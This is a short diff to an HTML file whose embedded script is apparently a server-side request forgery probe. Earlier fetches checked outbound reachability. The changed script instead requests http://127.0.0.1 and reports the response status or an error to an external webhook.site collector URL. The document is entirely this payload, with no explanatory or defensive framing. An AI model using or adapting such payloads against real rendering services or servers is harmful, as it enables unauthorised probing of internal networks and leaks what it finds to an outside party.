@@ -1,11 +1,13 @@
+<html>
+<body>
+
 <script>
 
-fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/start")
-
-fetch("https://securelayer7.net")
-.then(()=>fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/example-ok"))
-
-fetch("https://google.com")
-.then(()=>fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/google-ok"))
+fetch("http://127.0.0.1")
+.then(r => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/internal?status="+r.status))
+.catch(e => fetch("https://webhook.site/b1e161f9-7ffb-46f0-9c43-bb7491e1b6f0/error"))
 
 </script>
+
+</body>
+</html>
